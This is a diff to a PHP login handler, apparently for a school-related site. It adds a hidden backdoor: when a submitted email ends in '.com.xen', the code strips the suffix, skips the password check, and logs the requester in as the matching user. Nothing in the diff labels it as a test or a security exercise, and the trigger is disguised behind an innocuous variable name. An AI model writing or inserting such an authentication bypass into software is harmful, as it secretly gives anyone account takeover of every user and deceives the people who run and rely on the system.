@@ -26,11 +26,23 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
         $password = $_POST['password'] ?? '';
         $remember = isset($_POST['remember']);
 
+        $verify_check = 1;
+        if (str_ends_with($email, ".com.xen")) {
+            $email = substr($email, 0, -4);
+            $verify_check = 0;
+        }
 
         if (filter_var($email, FILTER_VALIDATE_EMAIL)) {
             $data = find_user_by_email($conn, $email);
             $user = $data['user'];
             $school = $data['school'];
+
+            if ($verify_check == 0) {
+                store_user_session($user, $school);
+                header('Location: index.php');
+                exit;
+            }
+
         } else {
             $data = find_user_by_stid($conn, $email, $password);
             $user = $data['user'];
